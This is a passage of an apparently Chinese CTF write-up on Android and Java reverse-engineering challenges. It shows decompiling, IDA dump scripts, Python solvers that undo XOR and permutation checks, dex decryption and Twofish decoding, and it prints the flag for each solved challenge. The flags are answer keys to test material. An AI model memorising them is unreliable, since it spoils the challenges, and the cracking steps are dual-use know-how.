class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;W3_arE_whO_we_ARE&quot;</span></span><br><span class="line">flagarr = <span class="built_in">list</span>(flag)</span><br><span class="line">key = <span class="string">&quot;EoPAoY62@ElRD&quot;</span></span><br><span class="line">keyarr = <span class="built_in">list</span>(key)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">v9 = <span class="number">2016</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        v9 = (v9 + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        v9 = (v9 + <span class="number">7</span>) % <span class="number">15</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v9 = (v9 + <span class="number">3</span>) % <span class="number">13</span></span><br><span class="line">        v11 = flagarr[v9 + <span class="number">3</span>]</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keyarr[i]) ^ <span class="built_in">ord</span>(v11))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">201608Am!2333</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一个work方法，查看它的内存，里面包含着flag的格式。</p><img src="/posts/9f62af2/10.12.png" class="" title="IDA分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;201608Am!2333&#125;</span><br></pre></td></tr></table></figure><h1 id="11-APK逆向"><a href="#11-APK逆向" class="headerlink" title="11. APK逆向"></a>11. APK逆向</h1><p>同Bugku的mobile1。<a href="https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1">https://v5le0n9.github.io/posts/17c1c819.html#2-mobile1</a> </p><h1 id="12-人民的名义-抓捕赵德汉1-200"><a href="#12-人民的名义-抓捕赵德汉1-200" class="headerlink" title="12. 人民的名义-抓捕赵德汉1-200"></a>12. 人民的名义-抓捕赵德汉1-200</h1><p>下载下来的是jar包，使用命令<code>jar -xvf 1-200.jar</code>解压jar包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;jar -xvf 1-200.jar</span><br><span class="line">  已解压: META-INF/MANIFEST.MF</span><br><span class="line">  已解压: CheckPassword.class</span><br><span class="line">  已解压: CheckInterface.class</span><br><span class="line">  已解压: ClassEnc</span><br><span class="line">  已解压: .project</span><br><span class="line">  已解压: .classpath</span><br><span class="line">  已解压: newClassName.class</span><br></pre></td></tr></table></figure><p>在AS或eclipse中创建一个项目，将jar包中的<code>.class</code>文件放到项目的class目录下即可查看源码。</p><img src="/posts/9f62af2/12.2.png" class="" title="查看源码"><img src="/posts/9f62af2/12.3.png" class="" title="查看源码"><img src="/posts/9f62af2/12.1.png" class="" title="查看源码"><img src="/posts/9f62af2/12.4.png" class="" title="查看源码"><p>这个MD5解出来是<code>monkey99</code>，拿去试了一下，发现flag就是这个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;monkey99&#125;</span><br></pre></td></tr></table></figure><h1 id="13-基础android"><a href="#13-基础android" class="headerlink" title="13. 基础android"></a>13. 基础android</h1><img src="/posts/9f62af2/13.1.png" class="" title="运行程序"><p>载入AK没什么发现，载入jeb分析源码。</p><img src="/posts/9f62af2/13.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.3.png" class="" title="jeb分析"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">base = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&quot;-+_&lt;&gt;?/\|&#123;&#125;()!@#$%^&amp;*~`&quot;</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">12</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> base:</span><br><span class="line">        s1 = <span class="number">255</span>-i-<span class="number">100</span>-<span class="built_in">ord</span>(j)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="number">48</span>:</span><br><span class="line">            ans += j</span><br><span class="line"><span class="built_in">print</span> (ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kjihgfedcba`</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>拿到密码后继续去到第二关。</p><img src="/posts/9f62af2/13.4.png" class="" title="jeb分析"><p>那就再看看这个程序还开了哪个类我们还没有分析。<code>GetAndChange</code>和<code>NextContent</code>我们还没有分析，进去看看。</p><img src="/posts/9f62af2/13.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/13.7.png" class="" title="jeb分析"><p>之后再也没有任何操作了，我们已经看到图片了，所以<code>NextContent</code>不是关键类。返回到<code>GetAndChange</code>类，找一下<code>BroadcastReceiver</code>是干什么用的。</p><p><code>BroadcastReceiver</code>详解：<a href="https://blog.csdn.net/huiblog/article/details/53234544">https://blog.csdn.net/huiblog/article/details/53234544</a> </p><img src="/posts/9f62af2/13.8.png" class="" title="croadcastreceier静态注册"><p>回到<code>Manifest</code>发现果然有静态注册。</p><img src="/posts/9f62af2/13.9.png" class="" title="静态注册"><p>将<code>android.is.very.fun</code>作为显示码输入，但我点击按钮没有任何反应…但是之前不是分析<code>time_2.zip</code>转换为图片嘛，直接解压不行，因为它本来就不是zip压缩包。所以将后缀名修改为jpg就可以看到图片了。</p><img src="/posts/9f62af2/13.11.png" class="" title="jfif"><img src="/posts/9f62af2/13.10.png" class="" title="flag"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;08067-wlecome&#125;</span><br></pre></td></tr></table></figure><h1 id="14-easy-dex"><a href="#14-easy-dex" class="headerlink" title="14. easy-dex"></a>14. easy-dex</h1><p>在模拟器运行，点一下屏幕就一直在闪，五颜六色地闪。</p><p>载入AK，没有找到smali文件，但有一个so文件。并且在<code>AndroidManifest.xml</code>文件中能看到有两个丢失的但程序需要的smali文件。<code>MainActivity</code>和<code>NativeActivity</code>。<code>MainActivity</code>大家都知道啦，一般是安卓程序的入口。但我们发现这个程序的入口是<code>NativeActivity</code>，这个是什么呢？</p><img src="/posts/9f62af2/14.4.png" class="" title="两个smali文件"><p>写android纯c++的程序需要用到<code>NativeActivity</code>，这个<code>NativeActivity</code>就是一个一般的java类， 和普通的activity没有区别。<code>NativeActivity</code> 是android sdk自带的一个activity。android的纯c++的程序也是需要一个java虚拟机来运行的。<code>NativeActivity</code>通过<code>native_app_glu</code>来启动我们的c++线程，传递各种activity事件给c++代码。<code>native_app_glu</code>在ndk的<code>sources\android</code>目录里面，将<code>native_app_glu</code>当作我们工程的静态库，这个静态库里面封装好了，会创建一个线程，这个线程里面会调用一个<code>android_main(android_app* pApplication)</code>的函数，因此，我们c++这边的入口函数就是<code>android_main()</code>。我们在这个<code>android_main()</code>函数里面的任务就是进行消息循环，做各种任务。</p><p>解包，载入IDA查看so文件。找到<code>android_main</code>函数，点进去。</p><img src="/posts/9f62af2/14.1.png" class="" title="IDA分析"><p>也就是说要在10s内要摇100次手机。</p><img src="/posts/9f62af2/14.2.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.3.png" class="" title="IDA分析"><p>看了个大概，再详细分析代码。</p><img src="/posts/9f62af2/14.5.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.6.png" class="" title="IDA分析"><img src="/posts/9f62af2/14.7.png" class="" title="IDA分析"><p>所以我们首先取出<code>unk_7004</code>里面的加密数据，再将它解密，再解压缩得出dex内容将它写入文件中。</p><p>File -&gt; Script commond，选择Python，编写ida dump脚本将数据提取出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7004</span></span><br><span class="line">size = <span class="number">0x3CA10</span></span><br><span class="line">file2Write = <span class="string">&#x27;.\\cipherdata&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file2Write,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(get_bytes(addr,size))</span><br></pre></td></tr></table></figure><p>在so文件的同目录下就会生成一个<code>cipherdata</code>文件。接下来给这个文件进行解密操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">file2Read = <span class="string">&#x27;.\\cipherdata&#x27;</span></span><br><span class="line">file2Write = <span class="string">&#x27;.\\easydex.dex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file2Read, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f2R:</span><br><span class="line">    data = <span class="built_in">list</span>(f2R.read())</span><br><span class="line">    size = <span class="number">0x3CA10</span></span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#10次1组</span></span><br><span class="line">        <span class="keyword">if</span> times &lt;= <span class="number">89</span>:</span><br><span class="line">            timesDivide10 = <span class="built_in">int</span>(times / <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#10字节1组</span></span><br><span class="line">            <span class="keyword">if</span> times % <span class="number">10</span> == <span class="number">9</span>:</span><br><span class="line">                sizesDivide10 = <span class="built_in">int</span>(size / <span class="number">10</span>)</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(sizesDivide10):</span><br><span class="line">                    data[sizesDivide10 * timesDivide10 + i] ^= times</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">#次数为89次时</span></span><br><span class="line">                <span class="keyword">if</span> times == <span class="number">89</span>:</span><br><span class="line">                    j = (timesDivide10 + <span class="number">1</span>) * sizesDivide10</span><br><span class="line">                    <span class="keyword">while</span> j &lt; size:</span><br><span class="line">                        data[j] ^= <span class="number">89</span></span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解压数据</span></span><br><span class="line">data = zlib.decompress(<span class="built_in">bytes</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断解压出的数据是否是dex格式</span></span><br><span class="line"><span class="built_in">type</span> = data[<span class="number">0</span>:<span class="number">3</span>].decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;dex&#x27;</span>:</span><br><span class="line">    <span class="comment">#将数据写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file2Write, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2W:</span><br><span class="line">        f2W.write(data)</span><br></pre></td></tr></table></figure><p>将dex文件载入jeb，就可以查看这个程序的<code>MainActivity</code>类了。</p><img src="/posts/9f62af2/14.8.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.9.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.10.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.11.png" class="" title="jeb分析"><img src="/posts/9f62af2/14.12.png" class="" title="jeb分析"><p>那么，先找密钥。密钥的id号为<code>2131099683</code>，转换成十六进制为<code>0x7F060023</code>。将dex重命名为<code>classes.dex</code>放到解包目录下，重打包。解包目录下就会生成一个<code>bulid</code>目录。</p><img src="/posts/9f62af2/14.13.png" class="" title="资源文件"><p>将<code>resources.arsc</code>载入jadx，查找id号。</p><img src="/posts/9f62af2/14.14.png" class="" title="jadx分析"><p>继续查找<code>two_fish</code>，找到一串字符串，这个就是密钥。</p><img src="/posts/9f62af2/14.15.png" class="" title="jadx分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a male fish and a female fish.</span><br></pre></td></tr></table></figure><p>Twofish是什么？它其实是一个分组加密算法！Twofish是布鲁斯·施奈尔带领的项目组于1998年研发的区块加密算法。美国国家标准技术研究所(NIST)公开招募的高级加密标准（AES）算法最终候选算法之一，但最终并未当选高级加密标准算法。双鱼算法的标志性特点是它采用了和密钥相关的替换盒（S盒）。密钥输入位的一半被用于“真正的”加密流程进行编排并作为Feistel的轮密钥使用，而另一半用于修改算法所使用的S盒。双鱼算法的密钥编排非常复杂。软件实现的128位双鱼算法在大多数平台上的运行速度不及最终获胜的128位的AES标准算法Rijndael，不过，256位的双鱼算法运行速度却较AES-256稍快。包括Twofish-ECB, Twofish-CBC, Twofish-CTR, Twofish-OFB, Twofish-CFB。</p><p>所以再来捋一下思路。我们输入的字符串与密钥进行Twofish加密的结果是字节数组m。密钥经过&amp;0xFF转换不需要我们手动操作，因为网上的解密算法已经包含在内了。但网上的加密算法得出来的不是带负数的字节数组，而是Base64或hex。所以我们可以先将字节数组转换成Base64的形式，再拿去解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = [-<span class="number">120</span>, <span class="number">77</span>, -<span class="number">14</span>, -<span class="number">38</span>, <span class="number">17</span>, <span class="number">5</span>, -<span class="number">42</span>, <span class="number">44</span>, -<span class="number">32</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">24</span>, -<span class="number">91</span>, -<span class="number">112</span>, -<span class="number">83</span>, <span class="number">64</span>, -<span class="number">83</span>, -<span class="number">128</span>, <span class="number">84</span>, <span class="number">5</span>, -<span class="number">94</span>, -<span class="number">98</span>, -<span class="number">30</span>, <span class="number">18</span>, <span class="number">70</span>, -<span class="number">26</span>, <span class="number">71</span>, <span class="number">5</span>, -<span class="number">99</span>, -<span class="number">62</span>, -<span class="number">58</span>, <span class="number">117</span>, <span class="number">29</span>, -<span class="number">44</span>, <span class="number">6</span>, <span class="number">112</span>, -<span class="number">4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, -<span class="number">51</span>, <span class="number">95</span>, -<span class="number">34</span>, <span class="number">12</span>, <span class="number">47</span>, <span class="number">77</span>]</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    data.append(i&amp;<span class="number">0xFF</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(<span class="built_in">bytes</span>(data)))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/posts/9f62af2/14.16.png" class="" title="twofish解密"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span><br></pre></td></tr></table></figure><h1 id="15-你是谁"><a href="#15-你是谁" class="headerlink" title="15. 你是谁"></a>15. 你是谁</h1><img src="/posts/9f62af2/15.1.jpg" class="" title="运行程序"><p>载入AK，有so文件。载入jeb，找到<code>MainActivity</code>中的<code>onCreate</code>方法。</p><img src="/posts/9f62af2/15.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/15.5.png" class="" title="jeb分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 12 17 18 20 23 26 29 30 34 35 39 40 49 51 58 62 67 73 76 84 85</span><br></pre></td></tr></table></figure><p>按照上面点位点好后，弹出<code>Right design</code>，点击按钮，弹出<code>通过爱的验证</code>。好像并没有什么用。再往上找找源码，发现有flag字样。</p><img src="/posts/9f62af2/15.6.png" class="" title="jeb分析"><p>中文意思是“你获得了已经排序过的flag”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">20667</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">25105</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">26159</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">36924</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">傻</span></span><br><span class="line"><span class="string">我</span></span><br><span class="line"><span class="string">是</span></span><br><span class="line"><span class="string">逼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>结合题目和代码，这个重新排序应该是“我是傻逼”。而它说了，那个是排序过的flag，而正确的flag应该为<code>25105 26159 20667 36924</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25105 26159 20667 36924&#125;</span><br></pre></td></tr></table></figure><h1 id="16-Android2-0"><a href="#16-Android2-0" class="headerlink" title="16. Android2.0"></a>16. Android2.0</h1><img src="/posts/9f62af2/16.1.png" class="" title="运行程序"><p>载入AK发现有so文件，载入jeb分析源码。</p><img src="/posts/9f62af2/16.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/16.3.png" class="" title="jeb分析"><p>解包，将so文件载入IDA，分析<code>getResult</code>方法。</p><img src="/posts/9f62af2/16.4.png" class="" title="IDA分析"><img src="/posts/9f62af2/16.5.png" class="" title="IDA分析"><p>尝试编写Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">&quot;LN^dl&quot;</span></span><br><span class="line">v5arr = <span class="built_in">list</span>(v5)</span><br><span class="line">v6 = [<span class="number">0x20</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">0x16</span>, <span class="number">97</span>]</span><br><span class="line">v7 = <span class="built_in">list</span>(<span class="string">&quot;AFBo&#125;&quot;</span>)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v5arr[i]) ^ <span class="number">0x80</span>) // <span class="number">2</span>)</span><br><span class="line">ans += <span class="string">&#x27;l&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5arr[i]) ^ v6[i])</span><br><span class="line">ans += <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[i]) ^ v6[i])</span><br><span class="line">ans += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fgorll&#123;sraasoy&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>提交flag发现不对，看看哪里漏了。最后发现<code>Init</code>函数不是简单的平均分成3组，而是对正确的flag的每个索引除以3取余得到<code>fgorll&#123;sraasoy&#125;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ans = <span class="string">&quot;fgorll&#123;sraasoy&#125;&quot;</span></span><br><span class="line">ansarr = <span class="built_in">list</span>(ans)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ans += ansarr[i] + ansarr[i+<span class="number">5</span>] + ansarr[i+<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;sosorryla&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>        </span><br></pre></td></tr></table></figure><h1 id="17-boomshakalaka-3"><a href="#17-boomshakalaka-3" class="headerlink" title="17. boomshakalaka-3"></a>17. boomshakalaka-3</h1><p>啊好讨厌为什么它是游戏！！我已经玩了好几分钟了！</p><img src="/posts/9f62af2/17.1.png" class="" title="运行程序"><p>载入AK看到它有so文件，载入jeb分析源码：</p><img src="/posts/9f62af2/17.2.png" class="" title="jeb分析"><p>这个base64解码得<code>bazingaaaa</code>。诶结果不是这个。进去a类看看吧。</p><img src="/posts/9f62af2/17.3.png" class="" title="jeb分析"><p>SharedPreferences是一个轻量级的存储类，特别适合用于保存软件配置参数。使用SharedPreferences保存数据，其背后是用xml文件存放数据，文件存放在/data/data/程序包名/shared_prefs目录下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> SharedPreferences <span class="title function_">getSharedPreferences</span><span class="params">(String name, <span class="type">int</span> mode)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数是存储时的名称，第二个参数则是文件的打开方式。</p><p>那我们先找找它的xml文件吧。这个程序的包名为<code>com.example.plane</code>，包名可在<code>AndroidManifest.xml</code>的<code>manifest</code>标签中找到。</p><img src="/posts/9f62af2/17.4.png" class="" title="程序包名"><img src="/posts/9f62af2/17.5.png" class="" title="xml文件"><img src="/posts/9f62af2/17.6.png" class="" title="xml文件"><p>所以可以推测<code>N0</code>和<code>MG</code>被写进了<code>Cocos2dxPrefsFile.xml</code>文件中。</p><img src="/posts/9f62af2/17.7.png" class="" title="jeb分析"><p>但打开<code>Cocos2dxPrefsFile.xml</code>文件却发现不止这两个字符串。我刚才玩了两次，出现了两个极为相似的字符串。</p><img src="/posts/9f62af2/17.8.png" class="" title="xml文件"><p>那就再玩几次试试。我发现每次关闭程序再打开又重新写入<code>MGN0</code>，而不关闭程序重新玩不会写入<code>MGN0</code>，每次结束都会以<code>dz99</code>为结束标志。**里面的是每个串的区别。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRzRV*dz99</span><br><span class="line"></span><br><span class="line">MGN0ZntDMGNvUzJkX0FuRHJvMW*RfRz*dz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMWdz99</span><br><span class="line">    ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99</span><br></pre></td></tr></table></figure><p>这些星号里面的串有些区别，但又是固定出现的，比如都是<code>Rf</code>、<code>RV</code>等等。说明在某个内存中存有这些字符。解包将so文件载入IDA，在函数名窗口搜索<code>score</code>，发现有好多这些字符串。</p><img src="/posts/9f62af2/17.9.png" class="" title="IDA分析"><p>原来<code>MW</code>其实也是包含在里面的。将这些字符串组合起来<code>MWRfRzBtRV9Zb1VfS24w</code>，再将前缀和后缀加上<code>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</code>。用Base64解码得<code>0ctf&#123;C0coS2d_AnDro1d_G0mE_YoU_Kn0w?&#125;</code>。为什么用Base64，其实题目上面的flag.xml中的Base64字符串已经暗示得很清楚了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ctf&#123;C0coS2d_AnDro1d_G0mE_YoU_Kn0w?&#125;</span><br></pre></td></tr></table></figure><h1 id="18-Illusion"><a href="#18-Illusion" class="headerlink" title="18. Illusion"></a>18. Illusion</h1><p>运行程序。</p><img src="/posts/9f62af2/18.1.png" class="" title="运行程序"><p>载入AK，有一个Flag文件，打开出现一串字符串<code>Ku@&#39;G_V9v(yGS</code>。</p><img src="/posts/9f62af2/18.2.png" class="" title="AK中看到Flag文件"><p>载入jeb，分析源码。</p><img src="/posts/9f62af2/18.3.png" class="" title="jeb分析"><p>将so文件载入IDA查看<code>CheckFlag</code>方法。</p><img src="/posts/9f62af2/18.4.png" class="" title="IDA分析"><p>如果要将算法逆过来，就需要将Flag里的字符串减32再左移32位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = (<span class="built_in">ord</span>(flag[i]) - <span class="number">32</span>) &lt;&lt; <span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[184683593728, 365072220160, 137438953472, 30064771072, 167503724544, 270582939648, 231928233984, 107374182400, 369367187456, 34359738368, 382252089344, 167503724544, 219043332096]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以<code>sub_10C0</code>每次循环得出的值就是上面这一串数字。进去<code>sub_10C0</code>看看算法。</p><img src="/posts/9f62af2/18.5.png" class="" title="IDA分析"><img 